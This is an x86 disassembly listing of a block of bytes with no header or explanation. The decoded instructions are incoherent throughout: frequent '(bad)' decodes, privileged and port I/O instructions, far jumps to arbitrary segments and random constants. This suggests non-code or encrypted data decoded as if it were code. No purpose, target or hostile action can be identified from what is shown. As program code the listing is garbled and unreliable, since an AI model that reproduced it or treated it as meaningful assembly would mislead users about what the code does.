  42088c:	jg     0x420830
  42088e:	mov    ecx,0x6aacc733
  420893:	mov    al,ds:0x5fd56542
  420898:	call   FWORD PTR [edi-0x701d520b]
  42089e:	and    BYTE PTR [edi],cl
  4208a0:	gs aas 
  4208a2:	push   ecx
  4208a3:	xchg   ecx,eax
  4208a4:	enter  0x50bc,0x96
  4208a8:	mov    al,0x4f
  4208aa:	inc    eax
  4208ab:	test   eax,0x44a25640
  4208b0:	pop    ss
  4208b1:	inc    ebx
  4208b2:	arpl   WORD PTR [ecx+ebx*1-0xb],dx
  4208b6:	lds    eax,FWORD PTR [esi-0x498a5ef5]
  4208bc:	ins    BYTE PTR es:[edi],dx
  4208bd:	hlt    
  4208be:	inc    esp
  4208bf:	popa   
  4208c0:	ss cld 
  4208c2:	and    edi,DWORD PTR [edi]
  4208c4:	cmp    al,0xd
  4208c6:	(bad)  
  4208c8:	push   ebx
  4208c9:	into   
  4208ca:	fs sub al,cl
  4208cd:	mov    eax,0x4cb0ec05
  4208d2:	adc    ebp,ebp
  4208d4:	into   
  4208d5:	xor    al,0x6b
  4208d7:	icebp  
  4208d8:	mov    ah,0xdf
  4208da:	mov    ebp,0x8ea8fa1c
  4208df:	out    0x1d,al
  4208e1:	int3   
  4208e2:	sbb    BYTE PTR ds:0x7c56d5a7,bh
  4208e8:	jg     0x4208ad
  4208ea:	mov    al,0xcb
  4208ec:	fwait
  4208ed:	add    al,BYTE PTR [ebp+edx*2-0x7616b749]
  4208f4:	mov    dh,0x71
  4208f6:	sbb    esp,DWORD PTR [ecx+0x11610747]
  4208fc:	pop    ebp
  4208fd:	(bad)  
  4208fe:	jg     0x4208d5
  420900:	sub    ah,ah
  420902:	ss das 
  420904:	push   cs
  420905:	xor    al,0xe
  420907:	jge    0x4208ce
  420909:	cmp    DWORD PTR [esp+ebp*2-0x17],esp
  42090d:	loop   0x4208ce
  42090f:	stos   DWORD PTR es:[edi],eax
  420910:	and    ebp,DWORD PTR [edi-0x7e6cb880]
  420916:	in     eax,0x8d
  420918:	xor    eax,0x7d9a4ad4
  42091d:	or     al,0x94
  42091f:	jmp    0x4208fa
  420921:	mov    WORD PTR [eax],ss
  420923:	xor    al,0xea
  420925:	mov    edi,0xc62b4d0
  42092a:	icebp  
  42092b:	fsub   QWORD PTR cs:[eax+0x6b553c64]
  420932:	xchg   esp,eax
  420933:	cmc    
  420934:	cwde   
  420935:	dec    esp
  420936:	lock mov eax,0x2d9527bb
  42093c:	mov    ebp,0x7d6d6b70
  420941:	rcl    BYTE PTR [edi-0x56528028],cl
  420947:	pop    esi
  420948:	pusha  
  420949:	mov    bh,0xda
  42094b:	ret    0xc72c
  42094e:	add    ah,bl
  420950:	stc    
  420951:	jl     0x420914
  420953:	xchg   esp,eax
  420954:	scas   eax,DWORD PTR es:[edi]
  420955:	xchg   ebx,eax
  420956:	mov    edx,0x17da11f6
  42095b:	adc    eax,ebp
  42095d:	fwait
  42095e:	int    0x2f
  420960:	jmp    0x42bd:0xcd375e52
  420967:	fs in  al,0xd9
  42096a:	iret   
  42096b:	mov    ?,WORD PTR [ecx]
  42096d:	sub    BYTE PTR [edx-0x76fc1e50],dh
  420973:	xor    dl,BYTE PTR [ecx]
  420975:	mov    eax,0x9a54a14f
  42097a:	push   ds
  42097b:	lods   al,BYTE PTR ds:[esi]
  42097c:	mov    esi,DWORD PTR [ecx+0x3f2b3f7b]
  420982:	repz iret 
  420984:	and    ecx,edi
  420986:	test   eax,0xfe40de54
  42098b:	rol    DWORD PTR [ecx],0xb5
  42098e:	xor    ebp,DWORD PTR [edx+0x110df2aa]
  420994:	dec    edi
  420995:	(bad)  
  420996:	push   esp
  420997:	in     al,0x96
  420999:	loop   0x4209ef
  42099b:	mov    dl,0x69
  42099d:	mov    dl,0xdb
  42099f:	(bad)  [edi+0x51047c3]
  4209a5:	pop    ecx
  4209a6:	hlt    
  4209a7:	sar    BYTE PTR [eax+edx*4],1
  4209aa:	jne    0x420980
  4209ac:	jo     0x420978
  4209ae:	mov    dl,0xe6
  4209b0:	fnstsw WORD PTR [edx+ebp*8]
  4209b3:	repz icebp 
  4209b5:	mov    ah,0xf9
  4209b7:	jge    0x42099d
  4209b9:	or     edx,esp
  4209bb:	int    0x87
  4209bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209be:	inc    edi
  4209bf:	jmp    0xe5d7:0xfe9850f8
  4209c6:	jo     0x4209d5
  4209c8:	mov    cl,0xba
  4209ca:	xlat   BYTE PTR ds:[ebx]
  4209cb:	pop    es
  4209cc:	jmp    0xc7d9:0xb7915808
  4209d3:	mov    al,0x75
  4209d5:	fild   QWORD PTR [esi+edx*8]
  4209d8:	stos   BYTE PTR es:[edi],al
  4209d9:	and    bh,BYTE PTR [ebx+0x2b840c34]
  4209df:	test   eax,0xb34b9409
  4209e4:	mov    DWORD PTR [ecx],ebp
  4209e6:	lods   al,BYTE PTR ds:[esi]
  4209e7:	imul   BYTE PTR [edx]
  4209e9:	pop    ds
  4209ea:	adc    eax,ecx
  4209ec:	and    al,0xbf
  4209ee:	(bad)  
  4209ef:	repz mov dl,0x7b
  4209f2:	jmp    0x42099d
  4209f4:	mov    dl,BYTE PTR ds:0xb050a368
  4209fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209fb:	jo     0x420990
  4209fd:	addr16 mov dl,bh
  420a00:	call   0x8e57eb48
  420a05:	mov    cl,0xcb
  420a07:	int3   
  420a08:	fdivr  DWORD PTR [esi]
  420a0a:	xchg   BYTE PTR [ebp+0x16],dl
  420a0d:	call   0x1f1caaed
  420a12:	sub    DWORD PTR fs:[ecx-0x5216d4e4],edx
  420a19:	inc    ecx
  420a1a:	out    0xff,eax
  420a1c:	mov    ah,0x57
  420a1e:	call   0xabbcc61b
  420a23:	xchg   edi,eax
  420a24:	inc    esp
  420a25:	add    BYTE PTR [eax],dh
  420a27:	mov    al,0x9c
  420a29:	push   esi
  420a2a:	aam    0xc5
  420a2c:	xchg   ecx,eax
  420a2d:	jno    0x4209c2
  420a2f:	out    0xf1,eax
  420a31:	(bad)  
  420a32:	or     ch,BYTE PTR [ecx+0x5f801c2d]
  420a38:	dec    edi
  420a39:	adc    BYTE PTR [eax-0x61],ch
  420a3c:	pop    es
  420a3d:	(bad)  
  420a3e:	xchg   esp,eax
  420a3f:	aam    0xc9
  420a41:	xchg   edx,eax
  420a42:	xchg   esi,eax
  420a43:	ja     0x420a31
  420a45:	popf   
  420a46:	ror    DWORD PTR [eax+0x56065076],cl
  420a4c:	xchg   ecx,eax
  420a4d:	adc    dh,BYTE PTR [edi+edi*4+0x9]
  420a51:	xchg   esi,eax
  420a52:	push   es
  420a53:	(bad)  [edi+0x65]
  420a56:	in     al,dx
  420a57:	mov    al,0x37
  420a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a5a:	out    dx,al
  420a5b:	mov    ecx,0xe3716a88
  420a60:	push   0x857d3487
  420a65:	dec    ecx
  420a66:	test   cl,cl
  420a68:	cs push ss
  420a6a:	jmp    0xfe6a2c2f
  420a6f:	fwait
  420a70:	(bad)
  420a73:	mov    bh,ch
  420a75:	and    BYTE PTR [ebp-0x1ba308a],ah
  420a7b:	int    0x63
  420a7d:	pop    edx
  420a7e:	jmp    0x6de:0x8e257545
  420a85:	inc    eax
  420a86:	pop    edx
  420a87:	ins    BYTE PTR es:[edi],dx
  420a88:	inc    esi
  420a89:	not    esi
  420a8b:	sub    eax,0xc9f47dba
  420a90:	and    BYTE PTR [esi+ecx*4-0x7d],cl
  420a94:	sar    DWORD PTR [ebx+0x259e45d3],1
  420a9a:	je     0x420a2c
  420a9c:	out    0x13,eax
  420a9e:	xchg   esi,eax
  420a9f:	iret   
  420aa0:	inc    ebx
  420aa1:	shr    BYTE PTR [ebp+edx*1-0x6c903668],1
  420aa8:	mov    esi,0x2697146c
  420aad:	jle    0x420ab8
  420aaf:	add    bl,al
  420ab1:	fst    DWORD PTR [edx-0x319d7c0d]
  420ab7:	shr    DWORD PTR [esi],cl
  420ab9:	sub    ch,BYTE PTR [edx]
  420abb:	and    DWORD PTR [ebx+ecx*8+0x4e3d907b],esp
  420ac2:	nop
  420ac3:	shr    BYTE PTR [edi+0x56],0xe0
  420ac7:	pop    ebp
  420ac8:	mov    al,ds:0x944e1de
  420acd:	fstp   QWORD PTR [esi-0x5f2db7ca]
  420ad3:	xor    ebx,DWORD PTR [bp-0x2177]
  420ad8:	std    
  420ad9:	adc    esi,DWORD PTR [edx]
  420adb:	and    bh,al
  420add:	repz dec edi
  420adf:	je     0x420b40
  420ae1:	lahf   
  420ae2:	push   eax
  420ae3:	enter  0xc84,0xe1
  420ae7:	dec    eax
  420ae8:	dec    edx
  420ae9:	mov    cl,0x2a
  420aeb:	pop    edx
  420aec:	xor    edi,DWORD PTR [edi+0x1110fc4b]
  420af2:	addr16 xchg bl,cl
  420af5:	sub    al,0x91
  420af7:	inc    ebp
  420af8:	dec    ecx
  420af9:	rcr    BYTE PTR ds:0xc921a189,cl
  420aff:	mov    eax,0x7347b201
  420b04:	daa    
  420b05:	daa    
  420b06:	push   ss
  420b07:	out    0x17,al
  420b09:	gs or  eax,0x9bc2c657
  420b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b10:	arpl   sp,cx
  420b12:	xchg   ebx,eax
  420b13:	leave  
  420b14:	xor    ebx,edi
  420b16:	push   ebp
  420b17:	and    BYTE PTR [ebx-0x3abdab7],dh
  420b1d:	mov    BYTE PTR [esp+edi*2],al
  420b20:	fild   WORD PTR [esi-0x50]
  420b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b24:	push   es
  420b25:	pop    ebx
  420b26:	aaa    
  420b27:	sub    ebx,DWORD PTR [esi+0x5ed539c1]
  420b2d:	fsubp  st(3),st
  420b2f:	xor    edx,DWORD PTR [edi+0x362b5bca]
  420b35:	shl    DWORD PTR [edx+0x60fa6ad4],1
  420b3b:	cdq    
  420b3c:	in     eax,dx
  420b3d:	or     al,BYTE PTR [esi+0x1a]
  420b40:	outs   dx,BYTE PTR ds:[esi]
  420b41:	mov    ds:0x599fc5e9,al
  420b46:	out    dx,eax
  420b47:	mov    ebp,0x5e15c0fe
  420b4c:	jnp    0x420bb1
  420b4e:	xor    bl,BYTE PTR [edi]
  420b50:	outs   dx,DWORD PTR ds:[esi]
  420b51:	add    DWORD PTR ds:0x825e863f,eax
  420b57:	inc    ebx
  420b58:	arpl   WORD PTR [ebp-0x50],bx
  420b5b:	or     al,0xac
  420b5d:	stos   DWORD PTR es:[edi],eax
  420b5e:	and    al,0x35
  420b60:	adc    eax,0x775266ca
  420b65:	inc    ebx
  420b66:	xor    al,0xbd
  420b68:	sub    eax,0x3b2bb19e
  420b6d:	pop    ebp
  420b6e:	pop    edx
  420b6f:	jmp    0xf388:0x84b21b6c
  420b76:	jecxz  0x420b28
  420b78:	cwde   
  420b79:	xor    al,0x2a
  420b7b:	mov    edi,0x8ae85052
  420b80:	and    BYTE PTR [eax+edx*8],dh
  420b83:	mov    BYTE PTR [edi+0xcf0d12d],0x91
  420b8a:	xor    BYTE PTR [ebx-0x762b5c61],cl
  420b90:	rcl    DWORD PTR [esi-0x13],0x80
  420b94:	cmp    DWORD PTR [ecx+edx*1+0x70],eax
  420b98:	add    eax,0xf3d099f6
  420b9d:	add    eax,0x7163e35b
  420ba2:	jbe    0x420bad
  420ba4:	imul   eax,DWORD PTR [eax-0x38],0x5c451a13
  420bab:	es scas al,BYTE PTR es:[edi]
  420bad:	sbb    al,0xea
  420baf:	sub    esp,DWORD PTR [edi+0x1d96b1d6]
  420bb5:	cmp    BYTE PTR [esi-0x66334687],al
  420bbb:	dec    edx
  420bbc:	jae    0x420bf2
  420bbe:	popa   
  420bbf:	rcr    BYTE PTR [esi+0x1d],0x7a
  420bc3:	push   esp
  420bc4:	jmp    0xbd2d:0x767b179a
  420bcb:	out    dx,eax
  420bcc:	ss fisub DWORD PTR fs:[esi-0x27457b1f]
  420bd4:	ds mov bh,0x2d
  420bd7:	pop    edx
  420bd8:	cmp    eax,0x6aea196f
  420bdd:	mov    gs,WORD PTR [edx-0x412111b6]
  420be3:	inc    eax
  420be4:	mov    eax,ds:0x81d0337c
  420be9:	push   eax
  420bea:	sub    ecx,ebp
  420bec:	mov    DWORD PTR [ebp-0x54ce1fed],0x22c847fa
  420bf6:	ror    BYTE PTR [ebp-0x481fdfff],cl
  420bfc:	bound  ebx,QWORD PTR [ecx]
  420bfe:	dec    eax
  420bff:	int3   
  420c00:	js     0x420c66
  420c02:	mov    eax,ds:0x3abb166
  420c07:	xor    edi,eax
  420c09:	add    BYTE PTR [ebx-0x7f9fadbf],cl
  420c0f:	pop    edx
  420c10:	or     ch,ch
  420c12:	lods   eax,DWORD PTR ds:[esi]
  420c13:	push   edx
  420c14:	jmp    0x420b99
  420c16:	xchg   edx,eax
  420c17:	or     esp,DWORD PTR [edx+0x7bf23c03]
  420c1d:	(bad)  [ecx+0x7739c4c8]
  420c23:	pop    es
  420c24:	cdq    
  420c25:	sar    esp,1
  420c27:	cmp    eax,0x8cd84156
  420c2c:	ret    
  420c2d:	jl     0x420c3d
  420c2f:	in     eax,dx
  420c30:	cmp    BYTE PTR [eax+0x18],al
  420c33:	(bad)
  420c36:	aas    
  420c37:	push   ebx
  420c38:	scas   eax,DWORD PTR es:[edi]
  420c39:	arpl   WORD PTR [ecx+eiz*8],cx
  420c3c:	out    dx,al
  420c3d:	dec    eax
  420c3e:	je     0x420bce
  420c40:	cli    
  420c41:	mov    bl,BYTE PTR [ebp-0x34]
  420c44:	loope  0x420bff
  420c46:	sub    BYTE PTR [ebx],dl
  420c48:	repz fadd st(1),st
  420c4b:	sub    ebx,0xffffffdf
  420c4e:	lea    eax,[edx-0x95960ea]
  420c54:	(bad)  
  420c55:	retf   0xd63d
  420c58:	loop   0x420c6e
  420c5a:	cld    
  420c5b:	(bad)
  420c5f:	mov    edi,0x58d86879
  420c64:	mov    al,0x30
  420c66:	xchg   ebp,eax
  420c67:	in     eax,dx
  420c68:	sar    BYTE PTR [edx+ebx*1-0xeb1ab39],0x6
  420c70:	enter  0xce0c,0x70
  420c74:	jecxz  0x420cd6
  420c76:	or     eax,0xbac94c00
  420c7b:	or     bh,BYTE PTR [eax-0x37589e3]
  420c81:	ja     0x420c71
  420c83:	adc    dh,BYTE PTR [ecx]
  420c85:	push   ss
  420c86:	cmp    BYTE PTR [edx-0x42de8cf7],cl
  420c8c:	xchg   BYTE PTR [ebx],bh
  420c8e:	test   BYTE PTR [ecx+0x4eacd661],bh
  420c94:	jbe    0x420cfc
  420c96:	mov    eax,0x396a9c40
  420c9b:	or     BYTE PTR [edx+0x17834240],ch
  420ca1:	jo     0x420c9a
  420ca3:	and    al,BYTE PTR [esi]
  420ca5:	xor    eax,0xa75d6aab
  420caa:	pusha  
  420cab:	dec    ebx
  420cac:	and    ebp,edi
  420cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420caf:	adc    ecx,DWORD PTR ds:0x5945dfdc
  420cb5:	and    dl,BYTE PTR [eax]
  420cb7:	xchg   DWORD PTR ds:0xf6748a81,edi
  420cbd:	iret   
  420cbe:	int    0x67
  420cc0:	outs   dx,BYTE PTR ds:[esi]
  420cc1:	and    ebp,DWORD PTR [esi+ecx*1-0x47401d40]
  420cc8:	mov    ebx,0x1f23fa2f
  420ccd:	mov    edx,0xac436cb6
  420cd2:	ds sbb eax,0x7222a18b
  420cd8:	xor    eax,0xf9e13baa
  420cdd:	add    al,0x6f
  420cdf:	xor    bh,BYTE PTR [edi-0xb]
  420ce2:	mov    al,BYTE PTR [edx-0x35fb35e6]
  420ce8:	clc    
  420ce9:	arpl   WORD PTR [edx],dx
  420ceb:	enter  0x4c7d,0x66
  420cef:	rol    BYTE PTR [edx+0x7e],0x50
  420cf3:	test   DWORD PTR [ebp-0x163eeb09],esp
  420cf9:	fdivr  QWORD PTR [eax]
  420cfb:	cld    
  420cfc:	mov    dh,0xdc
  420cfe:	cmp    BYTE PTR [edi+0xb],ah
  420d01:	jbe    0x420d0e
  420d03:	sub    bl,BYTE PTR [edx-0x6f60dbe7]
  420d09:	push   ebp
  420d0a:	push   eax
  420d0b:	xor    al,0x39
  420d0d:	mov    eax,0x2cdd522e
  420d12:	retf   
  420d13:	push   cs
  420d14:	push   0xf0895ca
  420d19:	jp     0x420d99
  420d1b:	xchg   DWORD PTR [ecx],ecx
  420d1d:	int3   
  420d1e:	or     eax,0x2f73cd23
  420d23:	or     al,0xe5
  420d25:	add    esp,edx
  420d27:	js     0x420d5c
  420d29:	dec    esi
  420d2a:	hlt    
  420d2b:	repz (bad) 
  420d2d:	nop
  420d2e:	nop
  420d2f:	or     DWORD PTR [edx+edi*4+0x39281e63],0xeabe12f3
  420d3a:	push   ebx
  420d3b:	(bad)  
  420d3c:	jno    0x420d70
  420d3e:	add    dl,BYTE PTR [ebp+0x39]
  420d41:	sbb    ah,cl
  420d43:	cmp    ebp,DWORD PTR [ebp+0x1f]
  420d46:	popf   
  420d47:	fmul   QWORD PTR [ebx+esi*4-0x7d]
  420d4b:	xchg   esp,eax
  420d4c:	leave  
  420d4d:	inc    eax
  420d4e:	test   BYTE PTR [ebx],bl
  420d50:	mov    ch,0x3
  420d52:	jmp    0x75ea7589
  420d57:	call   0xdd0387d0
  420d5c:	pusha  
  420d5d:	les    edi,FWORD PTR [edx+esi*1-0x7a]
  420d61:	arpl   WORD PTR [ebx],si
  420d63:	pop    es
  420d64:	ss mov cl,0x37
  420d67:	sbb    edi,esi
  420d69:	sub    DWORD PTR [esi-0x72abb8b7],esp
  420d6f:	(bad)
  420d74:	xchg   DWORD PTR [esi+0x4bf2dcba],eax
  420d7a:	jle    0x420daf
  420d7c:	push   es
  420d7d:	inc    edx
  420d7e:	sar    BYTE PTR [esi+0x668a8dbc],1
  420d84:	outs   dx,DWORD PTR ds:[esi]
  420d85:	sti    
  420d86:	inc    edx
  420d87:	neg    DWORD PTR [ecx]
  420d89:	push   0xffffffed
  420d8b:	inc    edx
  420d8c:	or     al,0x13
  420d8e:	push   edx
  420d8f:	inc    ecx
  420d90:	xor    DWORD PTR [esi+0x7c566f09],esp
  420d96:	ins    BYTE PTR es:[edi],dx
  420d97:	sub    eax,0xb09d6203
  420d9c:	(bad)  
  420d9d:	pop    ds
  420d9e:	inc    DWORD PTR ds:0x3220dacf
  420da4:	cmp    edi,ebp
  420da6:	jmp    0x652d5a30
  420dab:	imul   edx,DWORD PTR [ecx-0x4c],0xffffffe4
  420daf:	or     BYTE PTR [edx],bh
  420db1:	lods   al,BYTE PTR ds:[esi]
  420db2:	leave  
  420db3:	mov    ecx,0xdae5d13d
  420db8:	xchg   BYTE PTR [edx-0x6bfa2048],ah
  420dbe:	lock lahf 
  420dc0:	sub    bh,0x2c
  420dc3:	mov    DWORD PTR [edx-0x2c],ecx
  420dc6:	(bad)  [edx-0x4a]
  420dc9:	push   edi
  420dca:	jecxz  0x420dfe
  420dcc:	jae    0x420d6d
  420dce:	mov    ebp,0x19a6de7b
  420dd3:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dd5:	sub    BYTE PTR [ecx-0x715c5a99],ah
  420ddb:	in     al,dx
  420ddc:	and    DWORD PTR [eax-0x4d],esp
  420ddf:	or     ecx,0x82bbda14
  420de5:	adc    bl,ah
  420de7:	fs push ds
  420de9:	jbe    0x420dbe
  420deb:	outs   dx,BYTE PTR ds:[esi]
  420dec:	pop    ss
  420ded:	mov    ecx,0x942e5451
  420df2:	in     al,dx
  420df3:	xchg   esp,eax
  420df4:	xchg   ebp,eax
  420df5:	test   DWORD PTR [ebp-0x64a85485],0x1666484b
  420dff:	push   eax
  420e00:	cmp    eax,0xfe6ce0b4
  420e05:	setne  BYTE PTR [esi-0x7ce748c5]
  420e0c:	add    al,BYTE PTR [esi-0x67]
  420e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e10:	jae    0x420e5d
  420e12:	int    0xc4
  420e14:	int3   
  420e15:	pusha  
  420e16:	pop    ecx
  420e17:	adc    DWORD PTR [ebx-0x322f8757],esi
  420e1d:	fadd   DWORD PTR [esi]
  420e1f:	and    BYTE PTR [ebx-0x74],0xc
  420e23:	push   esp
  420e24:	add    eax,0x829a13aa
  420e29:	mov    edi,0x26fa4dc6
  420e2e:	and    al,BYTE PTR [edi]
  420e30:	add    DWORD PTR [ebx+0x2a],0xd
  420e34:	std    
  420e35:	push   edx
  420e36:	out    0x98,eax
  420e38:	in     eax,0x4e
  420e3a:	pop    ecx
  420e3b:	ss sbb bl,dh
  420e3e:	xor    BYTE PTR [edi],0x1
  420e41:	sbb    esp,0x36
  420e44:	fbstp  TBYTE PTR [ebx-0x69196b87]
  420e4a:	push   esi
  420e4b:	xchg   ebp,eax
  420e4c:	mov    ebx,0x24f7a0ff
  420e51:	repz enter 0xe0e8,0xb
  420e56:	popf   
  420e57:	(bad)  
  420e59:	aas    
  420e5a:	ret    
  420e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e5c:	int    0xf3
  420e5e:	add    esi,ebp
  420e60:	sar    DWORD PTR [ebx+ebx*2-0x671d62e5],1
  420e67:	push   ss
  420e68:	into   
  420e69:	out    dx,al
  420e6a:	imul   DWORD PTR [edi]
  420e6c:	jmp    0x91eb:0xa30430e6
  420e73:	daa    
  420e74:	push   edx
  420e75:	mov    esi,0xf56144f3
  420e7a:	mov    DWORD PTR [eax],esi
  420e7c:	or     DWORD PTR [ecx-0x25f0ec30],esi
  420e82:	xlat   BYTE PTR ds:[ebx]
  420e83:	mov    eax,DWORD PTR [ecx+eiz*1-0x10baf2c9]
  420e8a:	fidiv  WORD PTR [esi]
  420e8c:	xor    al,BYTE PTR [edi+0x49]
  420e8f:	jl     0x420e33
  420e91:	xchg   esi,eax
  420e92:	add    al,0xc0
  420e94:	xor    BYTE PTR [ecx],bl
  420e96:	pop    ss
  420e97:	js     0x420ee3
  420e99:	scas   al,BYTE PTR es:[edi]
  420e9a:	adc    dh,bh
  420e9c:	in     al,0x1f
  420e9e:	pop    es
  420e9f:	inc    eax
  420ea0:	push   ecx
  420ea1:	nop
  420ea2:	and    cl,al
  420ea4:	mov    bl,0x9
  420ea6:	sbb    DWORD PTR [esi-0x2b],ecx
  420ea9:	pushf  
  420eaa:	fistp  DWORD PTR [edi-0x7e]
  420ead:	ins    BYTE PTR es:[edi],dx
  420eae:	mov    dh,0x91
  420eb0:	inc    ebp
  420eb1:	or     eax,0xe9101375
  420eb6:	pushf  
  420eb7:	xor    DWORD PTR [edi+0x21],eax
  420eba:	cmp    ch,bl
  420ebc:	jle    0x420eed
  420ebe:	sub    ah,BYTE PTR [ebx]
  420ec0:	ficom  DWORD PTR [esp+esi*4+0x0]
  420ec4:	add    BYTE PTR [eax],al
  420ec6:	add    BYTE PTR [eax],al
  420ec8:	add    BYTE PTR [eax],al
  420eca:	push   ebp
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     al,BYTE PTR [edi]
  420ed7:	pusha  
  420ed8:	leave  
  420ed9:	ds aad 0x9d
  420edc:	add    DWORD PTR [eax],eax
  420ede:	add    DWORD PTR [esi],0x667e0000
  420ee4:	out    0xaf,eax
  420ee6:	mov    ch,0xf1
  420ee8:	mov    cl,0x16
  420eea:	addr16 in al,0x94
  420eed:	or     BYTE PTR [ebp-0x43],0xeb
  420ef1:	push   esi
  420ef2:	enter  0x8e53,0xbe
  420ef6:	xchg   esp,eax
  420ef7:	sbb    al,BYTE PTR [esi+eiz*8]
  420efa:	mov    esp,0xf2e2debe
  420eff:	fcomp  DWORD PTR [eax+ecx*4+0x6f]
  420f03:	test   eax,0x9ca660c8
  420f08:	retf   
  420f09:	jg     0x420eb5
  420f0b:	fwait
  420f0c:	imul   esp,DWORD PTR [esi-0x27],0xd18d1544
  420f13:	jle    0x420f5e
  420f15:	(bad)  
  420f16:	lock pop ebx
  420f18:	out    0x45,eax
  420f1a:	(bad)  
  420f1b:	(bad)  
  420f1c:	clc    
  420f1d:	xor    eax,0xc1c7b162
  420f22:	fs in  al,0x6c
  420f25:	sub    BYTE PTR [ebx+0x787f4b9d],bh
  420f2b:	popf   
  420f2c:	mov    dl,0x9e
  420f2e:	xrelease mov BYTE PTR [ecx+0x2892db9b],ah
  420f35:	test   BYTE PTR [ebx-0x43e5a802],dl
  420f3b:	das    
  420f3c:	cmp    eax,0x12d7867c
  420f41:	out    dx,al
  420f42:	xor    cl,BYTE PTR [ebx+0x5f5e8737]
  420f48:	int    0xbe
  420f4a:	mov    eax,ds:0x2ed3df5e
  420f4f:	mov    bl,0xfe
  420f51:	push   0x58
  420f53:	stos   BYTE PTR es:[edi],al
  420f54:	jo     0x420ee5
  420f56:	bound  eax,QWORD PTR [edx-0x66]
  420f59:	sub    ch,ch
  420f5b:	mov    esp,0x91319c18
  420f60:	cmp    al,0x87
  420f62:	retf   0x6d1
  420f65:	inc    edi
  420f66:	mov    edx,0xdc529387
  420f6b:	jno    0x420f8d
  420f6d:	lea    edx,[edi-0x560fa5e]
  420f73:	jp     0x420f5a
  420f75:	sub    al,0x1b
  420f77:	jl     0x420f19
  420f79:	test   al,0x78
  420f7b:	push   ds
  420f7c:	nop
  420f7d:	xchg   edi,eax
  420f7e:	icebp  
  420f7f:	mov    es,WORD PTR [edx-0x5d99801a]
  420f85:	mov    ebp,DWORD PTR gs:[ecx+0x5a]
  420f89:	rcl    ch,cl
  420f8b:	scas   eax,DWORD PTR es:[edi]
  420f8c:	fistp  WORD PTR [ecx-0x68]
  420f8f:	lahf   
  420f90:	pop    ss
  420f91:	mov    edx,0x9b3cfe63
  420f96:	mov    WORD PTR [ebx-0x54ccf25c],fs
  420f9c:	pop    ebx
  420f9d:	pop    edx
  420f9e:	shl    DWORD PTR [edx],cl
  420fa0:	xchg   edx,eax
  420fa1:	sbb    dl,ah
  420fa3:	add    esi,esp
  420fa5:	mov    dh,0x18
  420fa7:	outs   dx,DWORD PTR ds:[esi]
  420fa8:	mov    cl,0x8a
  420faa:	xor    ecx,DWORD PTR [ecx]
  420fac:	aas    
  420fad:	add    DWORD PTR [ebx+0x26],0x38
  420fb1:	mov    esi,0xc2e668a7
  420fb6:	(bad)  
  420fb7:	dec    ecx
  420fb8:	jns    0x420f6c
  420fba:	arpl   si,dx
  420fbc:	cli    
  420fbd:	out    0x9e,al
  420fbf:	ja     0x420fb5
  420fc1:	pop    edi
  420fc2:	popa   
  420fc3:	or     BYTE PTR [eax+esi*8-0x55],dh
  420fc7:	xchg   ebx,eax
  420fc8:	add    al,BYTE PTR [esi-0x71]
  420fcb:	mov    BYTE PTR [eax+0x28],al
  420fce:	ins    DWORD PTR es:[edi],dx
  420fcf:	mov    ebp,0x4466d663
  420fd4:	icebp  
  420fd5:	push   cs
  420fd6:	cli    
  420fd7:	stc    
  420fd8:	push   ds
  420fd9:	jbe    0x420ff5
  420fdb:	leave  
  420fdc:	jecxz  0x420fd3
  420fde:	test   eax,0x2758840e
  420fe3:	daa    
  420fe4:	mov    ch,0x6b
  420fe6:	shl    DWORD PTR [esi-0x3180ffeb],0xdb
  420fed:	inc    esi
  420fee:	repz push esp
  420ff0:	push   cs
  420ff1:	push   eax
  420ff2:	fdiv   DWORD PTR [eax]
  420ff4:	popf   
  420ff5:	repz push eax
  420ff7:	cli    
  420ff8:	jb     0x420fc6
  420ffa:	sbb    BYTE PTR [esi+eiz*4],0x90
  420ffe:	jmp    0x33b88bcf
  421003:	fcomp  st(6)
  421005:	aam    0x44
  421007:	and    cl,BYTE PTR [esi+0x2d]
  42100a:	idiv   DWORD PTR [edi]
  42100c:	ins    DWORD PTR es:[edi],dx
  42100d:	fidiv  DWORD PTR [ebx]
  42100f:	mov    edx,db3
  421012:	push   ecx
  421013:	pop    ecx
  421014:	loop   0x420fc8
  421016:	xor    al,0x94
  421018:	fnstenv [edi]
  42101a:	mov    esi,0xe2af0bc6
  42101f:	test   eax,0xce10e434
  421024:	adc    BYTE PTR [edi],cl
  421026:	dec    edi
  421027:	and    DWORD PTR [eax],0xff9b2af2
  42102d:	loopne 0x420fb1
  42102f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421030:	clc    
  421031:	inc    edx
  421032:	aad    0x67
  421034:	inc    eax
  421035:	jae    0x421097
  421037:	scas   eax,DWORD PTR es:[edi]
  421038:	add    eax,0xa95f9c1e
  42103d:	loop   0x421073
  42103f:	pop    ecx
  421040:	cmp    eax,0x9fd86e6a
  421045:	repz push ebx
  421047:	stos   BYTE PTR es:[edi],al
  421048:	add    eax,0x40782d79
  42104d:	enter  0xddc7,0xe8
  421051:	cmp    BYTE PTR [edx+eiz*8-0x7e295f0f],0xbd
  421059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42105a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42105b:	xchg   BYTE PTR [eax-0x66],bh
  42105e:	cmp    DWORD PTR [esp+eiz*2],eax
  421061:	mov    al,0x2b
  421063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421064:	sub    al,0x2b
  421066:	adc    DWORD PTR [ecx-0x75],ecx
  421069:	dec    esi
  42106a:	xchg   al,cl
  42106c:	cmp    esp,0x881fdeba
  421072:	xor    al,0xf3
  421074:	cwde   
  421075:	or     bl,BYTE PTR [esi+0x53f8db2b]
  42107b:	test   DWORD PTR [ebx],0x796fd104
  421081:	jmp    0x42100b
  421083:	pusha  
